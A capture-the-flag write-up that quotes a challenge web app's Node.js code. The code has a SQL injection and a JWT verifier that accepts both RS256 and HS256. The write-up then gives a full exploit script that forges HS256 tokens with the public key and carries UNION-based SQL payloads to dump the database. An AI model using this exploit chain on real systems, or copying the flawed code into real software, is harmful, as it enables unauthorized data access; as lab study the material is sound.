# Under Construction
![Screenshot from 2021-08-19 14-52-52](https://user-images.githubusercontent.com/87865134/130029943-e54ac3d8-10d0-49f4-9ee1-000c7142a301.png)

## Information Gathering & Analysis
- router:
```JavaScript
router.get('/', AuthMiddleware, async (req, res, next) => {
    try{
        let user = await DBHelper.getUser(req.data.username);
        if (user === undefined) {
            return res.send(`user ${req.data.username} doesn't exist in our database.`);
        }
        return res.render('index.html', { user });
    }catch (err){
        return next(err);
    }
});
```
- DBHelper.js:
```JavaScript
getUser(username){
        return new Promise((res, rej) => {
            db.get(`SELECT * FROM users WHERE username = '${username}'`, (err, data) => {
                if (err) return rej(err);
                res(data);
            });
        });
}
```
- AuthMiddleware.js:
```JavaScript
const JWTHelper = require('../helpers/JWTHelper');

module.exports = async (req, res, next) => {
    try{
        if (req.cookies.session === undefined) return res.redirect('/auth');
        let data = await JWTHelper.decode(req.cookies.session);
        req.data = {
            username: data.username
        }
        next();
    } catch(e) {
        console.log(e);
        return res.status(500).send('Internal server error');
    }
}
```
- JWTHelper.js:
```JavaScript
const fs = require('fs');
const jwt = require('jsonwebtoken');

const privateKey = fs.readFileSync('./private.key', 'utf8');
const publicKey  = fs.readFileSync('./public.key', 'utf8');

module.exports = {
    async sign(data) {
        data = Object.assign(data, {pk:publicKey});
        return (await jwt.sign(data, privateKey, { algorithm:'RS256' }))
    },
    async decode(token) {
        return (await jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] }));
    }
}
```
- Analysis:
  - when user navigate to `router.get('/')` -> `AuthMiddleware` check cookie of request -> use `JWTHelper` to verify cookie and then check whether user exist or not. If user exist -> get data of user from datase
  - `getUser()` function in `DBHelper.js` is SQLi vulnerability
  - flaw in `JWTHelper.js`:
    - `sign()` use asymmetric algorithm `RS256`: privateKey to sign
    - `decode()` use both asymmetric and symmetric algorithm (RS256, HS256) -> signature sign with `privateKey` can decode with `publicKey` by using `RS256`. However, signature sign with `publicKey` by using `HS256` can also decode with `publicKey` by using HS256

- How to exploit:
  - decode `cookie` to get data 
  - modify `cookie` to exploit SQLi
  - sign againt to send with request

## Exploit
- Nodejs script:
```JavaScript
const jwt = require('jsonwebtoken');
const request = require('request');

let url = 'http://46.101.23.188:32721/'
let account = {
    username: 'ndqk3',
    password: 'khanh29h'
}

const decode = (session) => {
    return jwt.decode(session)
}

const sign = (data, key, algorithm) => {
    return jwt.sign(data, key, { algorithm: algorithm })
}

const register = new Promise((resolve, reject) => {
    let req = request.post({
        url: url + 'auth',
        form: {
            username: account.username,
            password: account.password,
            register: "Register"
        }
    });

    req.on('response', res => {
        resolve(res)
    })

    req.on('error', err => {
        reject(err)
    })
})

const login = new Promise((resolve, reject) => {
    let req = request.post({
        url: url + 'auth',
        form: {
            username: account.username,
            password: account.password,
            login: "Login"
        }
    });

    req.on('response', res => {
        resolve(res)
    })

    req.on('error', err => {
        reject(err)
    })
})

//dump all tables
//let sql = `' union select 1,group_concat(name),3 from sqlite_master where type='table'--;`

//dump columns of table
//let sql = `' union select 1,sql,3 from sqlite_master where name='flag_storage'--;`

//dump data of table
let sql = `' union select 1,top_secret_flaag,3 from flag_storage --;`


register.then((res) => {
    login.then((response) => {
        let cookie = response.headers['set-cookie'][0]
        let token = cookie.slice(cookie.indexOf('=') + 1, cookie.indexOf(';'))
        let jwt = decode(token)
        jwt.username = sql
        request.get({ url: url, headers: { 'Cookie': `session=${sign(jwt, jwt.pk, "HS256")}` } }, (err, response, body) => {
            if (response.statusCode == 200) {
                res = body.match(/Welcome ([\s\S]*)<br>\n\s*This/)
                console.log(res[1])
            }
        })
    })
})
```
- run script and get flag

![Screenshot from 2021-08-19 19-56-14](https://user-images.githubusercontent.com/87865134/130072066-155ede63-ac02-4230-b242-2506c65a47fc.png)

## - Description
- **category:**
  - SQL injection
  - JWT key confusion
